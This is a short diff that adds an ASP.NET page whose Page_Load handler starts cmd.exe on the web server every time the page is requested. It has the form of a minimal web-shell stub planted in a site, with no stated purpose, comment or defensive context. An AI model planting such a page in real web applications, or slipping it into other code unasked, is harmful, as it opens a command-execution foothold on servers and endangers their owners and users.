@@ -1,0 +1,6 @@
+<%@ Page Language="C#" %>
+<script runat="server">
+void Page_Load(object s, EventArgs e) {
+  System.Diagnostics.Process.Start("cmd.exe");
+}
+</script>
